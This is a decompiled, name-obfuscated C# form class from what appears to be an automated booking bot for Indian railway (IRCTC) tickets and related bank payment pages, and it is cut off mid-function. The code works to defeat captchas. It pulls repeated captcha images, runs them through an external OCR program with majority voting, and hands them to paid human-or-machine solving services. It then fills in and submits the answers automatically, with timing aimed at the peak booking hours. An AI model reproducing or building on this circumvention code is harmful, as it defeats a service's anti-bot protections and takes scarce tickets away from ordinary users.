using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Bunifu.Framework.UI;
using Ionic.Zip;
using Microsoft.VisualBasic;

internal class frmCaptcha : Form
{
	private delegate string Delegate2(byte[] byte_0, int int_0);

	public static string ptth;

	public static string string_4;

	private string base64inage;

	public static bool isok_;

	private object lockObject = new object();

	private string string_0;

	private clsMain class28_0;

	private Control control_0;

	internal string string_1;

	public static string pks;

	internal Bitmap bitmap_0;

	private const int int_0 = 7;

	internal Image image_0;

	internal bool bool_0 = true;

	internal string string_2 = "";

	internal string string_3 = "";

	private string string_5 = "";

	private string string_6 = "";

	private string string_7 = "";

	internal static string string_8;

	internal static string string_9;

	internal string string_10;

	internal static string string_11;

	internal static string string_12;

	internal static string string_13;

	internal static string string_14;

	private bool bool_1;

	private bool bool_2;

	internal static bool bool_3;

	private System.Timers.Timer timer_0;

	private static bool bool_4;

	private IntPtr intptr_0 = IntPtr.Zero;

	private bool bool_5;

	private bool bool_6;

	private int int_2;

	private int int_3;

	private int int_4 = 5;

	internal bool bool_8;

	internal bool bool_9;

	internal bool bool_10;

	internal bool bool_11;

	private object object_0 = new object();

	private CookieContainer cookieContainer_0;

	internal DateTime dateTime_0 = DateTime.Now;

	internal DateTime dateTime_1 = DateTime.Now;

	protected static readonly int int_5;

	private static readonly IntPtr intptr_1;

	private StringBuilder stringBuilder_0 = new StringBuilder(256);

	protected static readonly string string_15;

	private IContainer icontainer_0;

	private LinkLabel lnkOTP;

	private Label label1;

	private PictureBox picThin;

	private Label label2;

	private PictureBox picDark;

	private Label label3;

	private Label label4;

	private PictureBox picDarkLarge;

	internal TextBox txtImageData;

	internal Label lblWrongCaptcha;

	private CheckBox chkDark;

	private CheckBox chkThin;

	private CheckBox chkDarkLarge;

	internal PictureBox picOriginal;

	private Panel pnlCaptcha;

	private BunifuImageButton btnCancel;

	public BunifuImageButton btnReferesh;

	private Panel pnlHeader;

	public Label lblTime;

	public System.Windows.Forms.Timer timer_1;

	public Button btnSubmit;

	private BunifuElipse bunifuElipse_0;

	internal Label tktname;

	private IContainer components;

	[DllImport("kernel32.dll")]
	internal static extern void un(uint uint_0);

	protected static NameValueCollection smethod_0(string string_16)
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		string text = string_16;
		string value = "?";
		if (text.Contains(value))
		{
			string_16 = string_16.Substring(string_16.IndexOf('?') + 1);
		}
		string input = string_16;
		string pattern = "&";
		string[] array = Regex.Split(input, pattern);
		string[] array2 = array;
		string[] array3 = array2;
		foreach (string input2 in array3)
		{
			string pattern2 = "=";
			string[] array4 = Regex.Split(input2, pattern2);
			if (array4.Length == 2)
			{
				nameValueCollection.Add(array4[0], array4[1]);
			}
			else
			{
				nameValueCollection.Add(array4[0], string.Empty);
			}
		}
		return nameValueCollection;
	}

	protected static NameValueCollection smethod_1(string string_16, string string_17)
	{
		string text = "http://";
		string text2 = string_15;
		string text3 = "/api/user";
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text + text2 + text3);
		string method = "POST";
		httpWebRequest.Method = method;
		string contentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentType = contentType;
		using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
		{
			string text4 = "username=";
			string text5 = "&password=";
			streamWriter.Write(text4 + string_16 + text5 + string_17);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string string_18 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		return smethod_0(string_18);
	}

	protected static NameValueCollection smethod_2(string string_16, string string_17, string string_18)
	{
		string[] array = new string[5];
		string text = "http://";
		array[0] = text;
		array[1] = string_15;
		string text2 = "/api/captcha/";
		array[2] = text2;
		array[3] = string_18;
		string text3 = "/report";
		array[4] = text3;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string.Concat(array));
		string method = "POST";
		httpWebRequest.Method = method;
		string contentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentType = contentType;
		using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
		{
			string text4 = "username=";
			string text5 = "&password=";
			streamWriter.Write(text4 + string_16 + text5 + string_17);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string string_19 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		return smethod_0(string_19);
	}

	protected static NameValueCollection smethod_3(string string_16)
	{
		string text = "http://";
		string text2 = string_15;
		string text3 = "/api/captcha/";
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text + text2 + text3 + string_16);
		string method = "GET";
		httpWebRequest.Method = method;
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string string_17 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		return smethod_0(string_17);
	}

	protected static NameValueCollection smethod_4(string string_16, string string_17, byte[] byte_0)
	{
		string text = "http://";
		string text2 = string_15;
		string text3 = "/api/captcha";
		string requestUriString = text + text2 + text3;
		long ticks = DateTime.Now.Ticks;
		string text4 = "x";
		string text5 = ticks.ToString(text4);
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		string text6 = "multipart/form-data; boundary=";
		httpWebRequest.ContentType = text6 + text5;
		string method = "POST";
		httpWebRequest.Method = method;
		httpWebRequest.KeepAlive = true;
		using (BinaryWriter binaryWriter = new BinaryWriter(httpWebRequest.GetRequestStream()))
		{
			int num = byte_0.Length;
			string format = "\r\n--{0}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{1}\r\n--{0}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{2}\r\n--{0}\r\nContent-Disposition: form-data; name=\"captchafile\"; filename=\"image.jpg\"\r\nContent-Type: image/jpeg\r\nContent-Length: {3}\r\n\r\n";
			string value = string.Format(format, text5, string_16, string_17, num);
			binaryWriter.Write(value);
			binaryWriter.Write(byte_0);
			string text7 = "\r\n--";
			string text8 = "--";
			binaryWriter.Write(text7 + text5 + text8);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string text9 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		Console.WriteLine(text9);
		return smethod_0(text9);
	}

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool SetWindowPos(IntPtr intptr_5, IntPtr intptr_6, int int_6, int int_7, int int_8, int int_9, uint uint_3);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern IntPtr GetFocus();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern bool SetForegroundWindow(IntPtr intptr_5);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SetParent(IntPtr intptr_5, IntPtr intptr_6);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetClassName(IntPtr intptr_5, StringBuilder stringBuilder_1, int int_6);

	internal frmCaptcha(clsMain class28_1)
	{
		InitializeComponent();
		class28_0 = class28_1;
		string text = "";
		string_7 = text;
		string text2 = "frmCaptcha-";
		base.Name = text2 + Thread.CurrentThread.Name;
	}

	internal frmCaptcha(clsMain class28_1, CookieContainer cookieContainer_1, string string_16, string string_17)
	{
		InitializeComponent();
		Control.CheckForIllegalCrossThreadCalls = false;
		string_5 = string_16;
		cookieContainer_0 = cookieContainer_1;
		string_6 = string_17;
		class28_0 = class28_1;
		string text = "";
		string_7 = text;
		tktname.Text = class28_0.TktName_;
		string text2 = string_5;
		string value = "billdesk.com";
		if (text2.Contains(value))
		{
			txtImageData.CharacterCasing = CharacterCasing.Normal;
		}
	}

	private void method_0()
	{
		txtImageData.Text = "";
		txtImageData.Focus();
		int_3 = 0;
		string variable = "AutofillCp";
		bool.TryParse(Environment.GetEnvironmentVariable(variable, EnvironmentVariableTarget.Process), out clsMain.bool_16);
		string variable2 = "AutoSubmitCp";
		bool.TryParse(Environment.GetEnvironmentVariable(variable2, EnvironmentVariableTarget.Process), out clsMain.bool_17);
	}

	internal void method_2(Control control_1, Rectangle rectangle_0, string string_16)
	{
		try
		{
			string_0 = string_16;
			base64inage = string_16;
			method_4(control_1, rectangle_0);
			clsMain clsMain2 = class28_0;
			string string_17 = "ShowForm";
			clsMain2.Lock(string_17);
			if (bool_9 || bool_8)
			{
				lblTime.Visible = true;
				timer_1.Enabled = true;
			}
			string text = lblWrongCaptcha.Text;
			string value = "AFTER PAYMENT";
			if (text.Contains(value))
			{
				BackColor = Color.MediumAquamarine;
			}
			if (rectangle_0.Width < 280)
			{
				label2.Visible = false;
				chkThin.Visible = false;
				picThin.Visible = false;
				label4.Visible = false;
				chkDarkLarge.Visible = false;
				picDarkLarge.Visible = false;
				label3.Visible = false;
				chkDark.Visible = false;
				picDark.Visible = false;
				if (!clsMain.bool_18)
				{
					_ = rectangle_0.Height;
				}
			}
			string text2 = lblWrongCaptcha.Text;
			string value2 = "BOI";
			if (text2.Contains(value2))
			{
				picOriginal.Width = rectangle_0.Width - 5;
				picOriginal.Left = 1;
			}
		}
		catch (Exception ex)
		{
			clsMain clsMain3 = class28_0;
			string text3 = "ShowForm err=";
			clsMain3.Lock(text3 + ex.Message);
		}
		try
		{
			if (class28_0.isAPP)
			{
				BackColor = Color.Turquoise;
			}
			else
			{
				BackColor = SystemColors.Control;
			}
			if (class28_0.isFinalCaptcha)
			{
				bitmap_0 = new Bitmap(method_7(string_0));
				method_3();
				SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
				method_6(null);
				btnSubmit.Enabled = true;
				Button button = btnSubmit;
				string text4 = "Submit";
				button.Text = text4;
				ShowDialog();
			}
			else
			{
				bitmap_0 = new Bitmap(method_7(string_0));
				method_3();
				SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
				btnReferesh_Click(null, null);
				btnSubmit.Enabled = true;
				Button button2 = btnSubmit;
				string text5 = "Submit";
				button2.Text = text5;
				ShowDialog();
			}
		}
		catch (ThreadAbortException)
		{
			Thread.ResetAbort();
		}
		catch
		{
		}
	}

	private void method_3()
	{
		try
		{
			intptr_0 = GetForegroundWindow();
			if (intptr_0 != IntPtr.Zero)
			{
				GetClassName(intptr_0, stringBuilder_0, stringBuilder_0.Capacity);
				control_0 = Control.FromHandle(intptr_0);
			}
		}
		catch
		{
			intptr_0 = IntPtr.Zero;
		}
	}

	internal void method_4(Control control_1, Rectangle rectangle_0)
	{
		_ = control_1.Controls[0];
		Control control = control_1.Parent;
		base.Width = rectangle_0.Width;
		base.StartPosition = FormStartPosition.Manual;
		base.Location = control.Location;
		base.Left += 2;
		base.Height += -6;
		base.TopMost = true;
	}

	internal void method_5(Control control_1, Rectangle rectangle_0, string string_16, string string_17, string string_18)
	{
		try
		{
			method_4(control_1, rectangle_0);
			string_3 = string_17;
			label1.Visible = false;
			label2.Visible = false;
			label3.Visible = false;
			label4.Visible = false;
			picOriginal.Visible = false;
			picDark.Visible = false;
			picDarkLarge.Visible = false;
			picThin.Visible = false;
			chkDark.Visible = false;
			chkDarkLarge.Visible = false;
			chkThin.Visible = false;
			lblWrongCaptcha.Text = string_18;
			_ = rectangle_0.Height;
			btnReferesh.Visible = false;
			if (string_17.Length > 0)
			{
				lnkOTP.Left = txtImageData.Left;
				lnkOTP.Top = txtImageData.Top + txtImageData.Height + 5;
				lnkOTP.Visible = true;
				lnkOTP_LinkClicked(null, null);
			}
			bool_1 = true;
			SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
			ShowDialog();
		}
		catch (ThreadAbortException)
		{
			Thread.ResetAbort();
		}
		catch
		{
		}
	}

	private void btnReferesh_Click(object sender, EventArgs e)
	{
		try
		{
			string_1 = null;
			bitmap_0 = null;
			Thread thread = new Thread(method_6);
			thread.IsBackground = true;
			thread.Start(0);
		}
		catch
		{
		}
	}

	private void method_6(object object_1)
	{
		bool bool_ = false;
		WebException webException_ = null;
		string text = "";
		int num = 10000;
		if ((DateTime.Now.Hour == 10 && DateTime.Now.Minute > 50) || DateTime.Now.Hour >= 11)
		{
			num = 80000;
		}
		int_3++;
		if (int_3 <= 5)
		{
			if (int_3 > 1)
			{
				num = 15000;
				if (DateTime.Now.Hour == 11)
				{
					num = 80000;
				}
			}
			try
			{
				clsMain clsMain2 = class28_0;
				string[] array = new string[8];
				string text2 = "Loading Captcha in LoadImage _ AutoCaptIssue: ";
				array[0] = text2;
				string text3 = string_5.ToUpper();
				string value = "IRCTC";
				array[1] = text3.Contains(value).ToString();
				string text4 = "  isAutoFillCaptcha=";
				array[2] = text4;
				array[3] = bool_6.ToString();
				string text5 = "  serviceType=";
				array[4] = text5;
				array[5] = string_13;
				string text6 = "   Hour=";
				array[6] = text6;
				array[7] = DateTime.Now.Hour.ToString();
				clsMain2.Lock(string.Concat(array));
				text = "";
				DateTime dateTime_ = DateTime.Now.AddMilliseconds(400.0);
				int int_ = 0;
				Application.DoEvents();
				string loginType = class28_0.LoginType;
				string text7 = "NGET";
				Bitmap bitmap;
				if (!(loginType == text7))
				{
					string loginType2 = class28_0.LoginType;
					string text8 = "WEB";
					if (loginType2 == text8)
					{
						if (string_0 == null)
						{
							class28_0.method_81(this);
						}
						bitmap = new Bitmap(method_7(string_0));
					}
					else
					{
						string loginType3 = class28_0.LoginType;
						string text9 = "APP";
						if (loginType3 == text9)
						{
							if (string_0 == null)
							{
								class28_0.method_82(this);
							}
							bitmap = new Bitmap(method_7(string_0));
						}
						else
						{
							if (string_5 == "")
							{
								return;
							}
							bitmap = class28_0.method_101(string_5, string_6, class28_0.webProxy_2, ref cookieContainer_0, bool_63: true, num * int_3, ref bool_, ref webException_, ref text, ref dateTime_, ref int_);
						}
					}
				}
				else
				{
					if (string_5 == "")
					{
						return;
					}
					bitmap = class28_0.method_101(string_5, string_6, class28_0.webProxy_2, ref cookieContainer_0, bool_63: true, num * int_3, ref bool_, ref webException_, ref text, ref dateTime_, ref int_);
				}
				try
				{
					picOriginal.Width = base.Width - 4;
					picOriginal.BackColor = Color.FromArgb(4, 65, 76);
					picOriginal.Image = bitmap;
					if (bitmap.Height == 20 && bitmap.Width == 308)
					{
						picOriginal.Size = new Size(517, 45);
						picOriginal.Left = -280;
					}
					picOriginal.SizeMode = PictureBoxSizeMode.StretchImage;
					picOriginal.Refresh();
					clsMain clsMain3 = class28_0;
					string text10 = "Captcha Received =";
					clsMain3.Lock(text10 + string_0);
					dateTime_1 = dateTime_;
					btnReferesh.Enabled = true;
				}
				catch
				{
				}
				try
				{
					if (bitmap != null)
					{
						clsMain clsMain4 = class28_0;
						string[] array2 = new string[6];
						string text11 = "isFss=";
						array2[0] = text11;
						array2[1] = bool_8.ToString();
						string text12 = ",  BtecPath=";
						array2[2] = text12;
						array2[3] = string_7;
						string text13 = ",  fssHitCount=";
						array2[4] = text13;
						array2[5] = int_2.ToString();
						clsMain4.Lock(string.Concat(array2));
						string text14 = string_5;
						string value2 = "billdesk.com";
						if (text14.Contains(value2))
						{
							if (!method_8(bitmap))
							{
								Bitmap bitmap2 = bitmap.Clone(new Rectangle(0, 0, bitmap.Width, bitmap.Height), bitmap.PixelFormat);
								byte[] byte_;
								using (MemoryStream memoryStream = new MemoryStream())
								{
									bitmap2.Save(memoryStream, ImageFormat.Bmp);
									byte_ = memoryStream.ToArray();
								}
								method_20(byte_, 5);
							}
						}
						else
						{
							method_0();
							_ = (Bitmap)bitmap.Clone();
							string object_2 = "";
							lock (lockObject)
							{
								object_2 = SolveCaptcha(base64inage);
							}
							method_27(object_2);
							clsMain clsMain5 = class28_0;
							string string_ = "Inside IRCTC OCR auto captcha";
							clsMain5.Lock(string_);
							int_2++;
							_ = DateTime.Now;
						}
					}
				}
				catch (Exception ex)
				{
					string message = ex.Message;
					string value3 = "cannot find the file";
					if (message.Contains(value3) && !bool_4)
					{
						bool_4 = true;
						string message2 = ex.Message;
						string caption = "OCR";
						MessageBox.Show(message2, caption, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					}
				}
			}
			catch
			{
			}
		}
		if (clsMain.bool_17)
		{
			if (!class28_0.isFinalCaptcha)
			{
				Thread.Sleep(2500);
			}
			btnSubmit_Click(this, null);
		}
		bitmap_0 = null;
	}

	internal Image method_7(string string_16)
	{
		byte[] array = Convert.FromBase64String(string_16);
		using MemoryStream stream = new MemoryStream(array, 0, array.Length);
		return Image.FromStream(stream, useEmbeddedColorManagement: true);
	}

	private bool method_8(Bitmap bitmap_1)
	{
		if (string_7.Length >= 5)
		{
			try
			{
				if (File.GetLastWriteTime(string_7).Year < 2017)
				{
					return false;
				}
				string path = string_7;
				string path2 = "tmp";
				string text = Path.Combine(path, path2);
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				int int_ = 0;
				bool bool_ = false;
				WebException webException_ = null;
				string string_ = "";
				DateTime dateTime_ = DateTime.Now;
				List<string> list = new List<string>();
				list.Add(text);
				Bitmap bitmap = bitmap_1.Clone(new Rectangle(0, 0, bitmap_1.Width, bitmap_1.Height), bitmap_1.PixelFormat);
				int num = 17;
				Random random = new Random();
				for (int i = 1; i <= num; i++)
				{
					if (bitmap != null)
					{
						clsMain clsMain2 = class28_0;
						string text2 = "BOI,  HitCount=";
						clsMain2.Lock(text2 + i);
						Bitmap bitmap2 = method_19(bitmap);
						string[] array = new string[5];
						string text3 = "bill";
						array[0] = text3;
						DateTime now = DateTime.Now;
						string text4 = "ddMMyyhhmmssfff";
						array[1] = now.ToString(text4);
						array[2] = i.ToString();
						array[3] = random.Next(1, 5000).ToString();
						string text5 = ".jpg";
						array[4] = text5;
						string text6 = string.Concat(array);
						bitmap2.Save(Path.Combine(text, text6));
						list.Add(text6);
					}
					if (i >= num)
					{
						break;
					}
					bitmap = class28_0.method_101(string_5, string_6, class28_0.webProxy_2, ref cookieContainer_0, bool_63: true, 5000, ref bool_, ref webException_, ref string_, ref dateTime_, ref int_);
				}
				if (list.Count > 1)
				{
					Process process = new Process();
					ProcessStartInfo startInfo = process.StartInfo;
					string path3 = string_7;
					string path4 = "Btec.exe";
					startInfo.FileName = Path.Combine(path3, path4);
					string separator = "|";
					string text7 = string.Join(separator, list.ToArray());
					ProcessStartInfo startInfo2 = process.StartInfo;
					string text8 = "\"";
					string text9 = "\"";
					startInfo2.Arguments = text8 + text7 + text9;
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.RedirectStandardOutput = true;
					process.Start();
					try
					{
						StreamReader standardOutput = process.StandardOutput;
						process.WaitForExit(3500);
						string text10 = standardOutput.ReadLine();
						if (string.IsNullOrEmpty(text10))
						{
							string text11 = " ";
							text10 = text11;
						}
						clsMain clsMain3 = class28_0;
						string text12 = "OCR Output: ";
						clsMain3.Lock(text12 + text10);
						if (!process.HasExited)
						{
							process.Kill();
						}
						if (text10.Length >= 6)
						{
							string text13 = text10;
							string[] array2 = new string[1];
							string text14 = "||";
							array2[0] = text14;
							string[] array3 = text13.Split(array2, StringSplitOptions.RemoveEmptyEntries);
							string text15 = "";
							Dictionary<char, int> dictionary = new Dictionary<char, int>();
							for (int j = 0; j < 6; j++)
							{
								string[] array4 = array3;
								string[] array5 = array4;
								string[] array6 = array5;
								foreach (string text16 in array6)
								{
									if (!dictionary.ContainsKey(text16[j]))
									{
										dictionary.Add(text16[j], 1);
									}
									else
									{
										dictionary[text16[j]]++;
									}
								}
								char c = ' ';
								int num2 = 0;
								foreach (char key in dictionary.Keys)
								{
									if (dictionary[key] > num2)
									{
										c = key;
										num2 = dictionary[key];
									}
								}
								text15 += c.ToString().Trim();
								dictionary.Clear();
							}
							if (text15.Length == 6)
							{
								txtImageData.Text = text15;
								btnSubmit.PerformClick();
								return true;
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return false;
		}
		return false;
	}

	private void btnSubmit_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(txtImageData.Text.Trim()) && txtImageData.Text.Trim().Length >= 2)
		{
			bool_5 = true;
			btnSubmit.Enabled = false;
			Button button = btnSubmit;
			string text = "Submitting...";
			button.Text = text;
			base.DialogResult = DialogResult.OK;
			Close();
		}
	}

	private void method_12()
	{
		base.DialogResult = DialogResult.Cancel;
		Close();
	}

	internal Bitmap method_15(Bitmap bitmap_1, int int_6, int int_7)
	{
		Bitmap bitmap = new Bitmap(int_6, int_7, bitmap_1.PixelFormat);
		double num = (double)bitmap_1.Width / (double)int_6;
		double num2 = (double)bitmap_1.Height / (double)int_7;
		Color color = default(Color);
		Color color2 = default(Color);
		Color color3 = default(Color);
		Color color4 = default(Color);
		for (int i = 0; i < bitmap.Width; i++)
		{
			for (int j = 0; j < bitmap.Height; j++)
			{
				int num3 = (int)Math.Floor((double)i * num);
				int num4 = (int)Math.Floor((double)j * num2);
				int num5 = num3 + 1;
				if (num5 >= bitmap_1.Width)
				{
					num5 = num3;
				}
				int num6 = num4 + 1;
				if (num6 >= bitmap_1.Height)
				{
					num6 = num4;
				}
				double num7 = (double)i * num - (double)num3;
				double num8 = (double)j * num2 - (double)num4;
				double num9 = 1.0 - num7;
				double num10 = 1.0 - num8;
				color = bitmap_1.GetPixel(num3, num4);
				color2 = bitmap_1.GetPixel(num5, num4);
				color3 = bitmap_1.GetPixel(num3, num6);
				color4 = bitmap_1.GetPixel(num5, num6);
				byte b = (byte)(num9 * (double)(int)color.B + num7 * (double)(int)color2.B);
				byte b2 = (byte)(num9 * (double)(int)color3.B + num7 * (double)(int)color4.B);
				byte blue = (byte)(num10 * (double)(int)b + num8 * (double)(int)b2);
				b = (byte)(num9 * (double)(int)color.G + num7 * (double)(int)color2.G);
				b2 = (byte)(num9 * (double)(int)color3.G + num7 * (double)(int)color4.G);
				byte green = (byte)(num10 * (double)(int)b + num8 * (double)(int)b2);
				b = (byte)(num9 * (double)(int)color.R + num7 * (double)(int)color2.R);
				b2 = (byte)(num9 * (double)(int)color3.R + num7 * (double)(int)color4.R);
				byte red = (byte)(num10 * (double)(int)b + num8 * (double)(int)b2);
				bitmap.SetPixel(i, j, Color.FromArgb(255, red, green, blue));
			}
		}
		bitmap = method_16(bitmap);
		return method_17(bitmap);
	}

	internal Bitmap method_16(Bitmap bitmap_1)
	{
		Bitmap bitmap = (Bitmap)bitmap_1.Clone();
		for (int i = 0; i < bitmap.Width; i++)
		{
			for (int j = 0; j < bitmap.Height; j++)
			{
				Color pixel = bitmap.GetPixel(i, j);
				byte b = (byte)(0.299 * (double)(int)pixel.R + 0.587 * (double)(int)pixel.G + 0.114 * (double)(int)pixel.B);
				bitmap.SetPixel(i, j, Color.FromArgb(b, b, b));
			}
		}
		return (Bitmap)bitmap.Clone();
	}

	internal Bitmap method_17(Bitmap bitmap_1)
	{
		for (int i = 0; i < bitmap_1.Width; i++)
		{
			for (int j = 0; j < bitmap_1.Height; j++)
			{
				Color pixel = bitmap_1.GetPixel(i, j);
				if (pixel.R < 162 && pixel.G < 162 && pixel.B < 162)
				{
					bitmap_1.SetPixel(i, j, Color.Black);
				}
			}
		}
		for (int k = 0; k < bitmap_1.Width; k++)
		{
			for (int l = 0; l < bitmap_1.Height; l++)
			{
				Color pixel2 = bitmap_1.GetPixel(k, l);
				if (pixel2.R > 162 && pixel2.G > 162 && pixel2.B > 162)
				{
					bitmap_1.SetPixel(k, l, Color.White);
				}
			}
		}
		return bitmap_1;
	}

	internal Bitmap method_18(Bitmap bitmap_1)
	{
		for (int i = 0; i < bitmap_1.Width; i++)
		{
			for (int j = 0; j < bitmap_1.Height; j++)
			{
				Color pixel = bitmap_1.GetPixel(i, j);
				if (pixel.R < 162 && pixel.G < 162 && pixel.B < 162)
				{
					bitmap_1.SetPixel(i, j, Color.Black);
				}
			}
		}
		for (int k = 0; k < bitmap_1.Width; k++)
		{
			for (int l = 0; l < bitmap_1.Height; l++)
			{
				Color pixel2 = bitmap_1.GetPixel(k, l);
				if (pixel2.R > 162 && pixel2.G > 162 && pixel2.B > 162)
				{
					bitmap_1.SetPixel(k, l, Color.White);
				}
			}
		}
		return bitmap_1;
	}

	private Bitmap method_19(Bitmap bitmap_1)
	{
		Color color = Color.FromArgb(255, Color.Black);
		Color color2 = Color.FromArgb(255, Color.White);
		Bitmap bitmap = new Bitmap(bitmap_1.Width, bitmap_1.Height);
		for (int i = 0; i < bitmap_1.Width; i++)
		{
			for (int j = 0; j < bitmap_1.Height; j++)
			{
				Color pixel = bitmap_1.GetPixel(i, j);
				if (pixel.R > 220 || pixel.G > 220 || pixel.B > 220)
				{
					bitmap.SetPixel(i, j, color);
				}
				else if (pixel.R <= 80 && pixel.G <= 80 && pixel.B <= 80)
				{
					bitmap.SetPixel(i, j, pixel);
				}
				else
				{
					bitmap.SetPixel(i, j, color2);
				}
			}
		}
		Bitmap bitmap2 = (Bitmap)bitmap.Clone();
		return method_15(bitmap2, bitmap2.Width * 2, bitmap2.Height * 2);
	}

	private void frmCaptcha_Shown(object sender, EventArgs e)
	{
		try
		{
			if (intptr_0 != IntPtr.Zero && stringBuilder_0 != null)
			{
				string text = stringBuilder_0.ToString().ToUpper();
				string value = "WINDOWSFORMS10.WINDOW.";
				if (text.Contains(value))
				{
					SetForegroundWindow(intptr_0);
				}
			}
		}
		catch
		{
		}
	}

	private void chkThin_CheckedChanged(object sender, EventArgs e)
	{
		picThin.Visible = chkThin.Checked;
	}

	private void chkDarkLarge_CheckedChanged(object sender, EventArgs e)
	{
		picDarkLarge.Visible = chkDarkLarge.Checked;
	}

	private void chkDark_CheckedChanged(object sender, EventArgs e)
	{
		picDark.Visible = chkDark.Checked;
	}

	private void method_20(byte[] byte_0, int int_6)
	{
		if (!clsMain.bool_46 || string.IsNullOrEmpty(clsMain.string_46))
		{
			string text = "0";
			string_13 = text;
		}
		int_4 = int_6;
		clsMain clsMain2 = class28_0;
		string text2 = "GetCaptcha  serviceType=";
		string text3 = string_13;
		string text4 = "  strAutoCaptchaService=";
		clsMain2.Lock(text2 + text3 + text4 + clsMain.string_46);
		try
		{
			string text5 = string_13;
			string text6 = "0";
			string text7 = text6;
			string text8;
			if (text5 != text7)
			{
				ThreadPool.QueueUserWorkItem(method_21, byte_0);
			}
			else if (((DateTime.Now.Hour == 7 && DateTime.Now.Minute > 53) || (DateTime.Now.Hour == 8 && DateTime.Now.Minute < 6) || (DateTime.Now.Hour == 9 && DateTime.Now.Minute > 53) || (DateTime.Now.Hour == 10 && DateTime.Now.Minute < 6) || (DateTime.Now.Hour == 10 && DateTime.Now.Minute > 53) || (DateTime.Now.Hour == 11 && DateTime.Now.Minute < 6)) && (text8 = string_13) != null)
			{
				string text9 = "0";
				if (text8 == text9)
				{
					ThreadPool.QueueUserWorkItem(method_21, byte_0);
				}
			}
		}
		catch (Exception ex)
		{
			clsMain clsMain3 = class28_0;
			string text10 = "GetCaptcha ERR=";
			clsMain3.Lock(text10 + ex.Message);
		}
	}

	private void method_21(object object_1)
	{
		try
		{
			byte[] array = (byte[])object_1;
			string text;
			if ((text = string_13) == null)
			{
				return;
			}
			string text2 = text;
			string text3 = "0";
			if (text2 == text3)
			{
				method_22(array, int_4);
				return;
			}
			string text4 = "1";
			if (text2 == text4)
			{
				method_24(array, int_4);
				return;
			}
			string text5 = "2";
			if (text2 == text5)
			{
				method_22(array, int_4);
				return;
			}
			string text6 = "3";
			if (text2 == text6)
			{
				method_29(array, int_4);
				return;
			}
			string text7 = "4";
			if (text2 == text7)
			{
				method_23(array, int_4);
				return;
			}
			string text8 = "5";
			if (text2 == text8)
			{
				byte[] byte_ = array;
				int int_ = int_4;
				method_26(byte_, int_);
			}
		}
		catch
		{
		}
	}

	internal string method_22(byte[] byte_0, int int_6)
	{
		string text = "";
		int num = 5;
		bool flag = false;
		bool flag2 = false;
		bool flag3 = false;
		bool flag4 = false;
		bool flag5 = false;
		string text2 = string_9;
		clsMain clsMain2 = class28_0;
		string string_ = "Inside Rip_captcha";
		clsMain2.Lock(string_);
		try
		{
			method_28(true);
			NameValueCollection nameValueCollection = new NameValueCollection();
			string name = "key";
			nameValueCollection.Add(name, text2);
			string name2 = "method";
			string value = "base64";
			nameValueCollection.Add(name2, value);
			string name3 = "soft_id";
			string value2 = "701";
			nameValueCollection.Add(name3, value2);
			string name4 = "body";
			nameValueCollection.Add(name4, Convert.ToBase64String(byte_0));
			NameValueCollection nameValueCollection2 = nameValueCollection;
			if (num > 0)
			{
				string name5 = "min_len";
				nameValueCollection2.Add(name5, num.ToString());
			}
			if (int_6 > 0)
			{
				string name6 = "max_len";
				nameValueCollection2.Add(name6, int_6.ToString());
			}
			if (flag)
			{
				string name7 = "numeric";
				string value3 = "1";
				nameValueCollection2.Add(name7, value3);
			}
			if (flag2)
			{
				string name8 = "phrase";
				string value4 = "1";
				nameValueCollection2.Add(name8, value4);
			}
			if (flag3)
			{
				string name9 = "regsense";
				string value5 = "1";
				nameValueCollection2.Add(name9, value5);
			}
			if (flag4)
			{
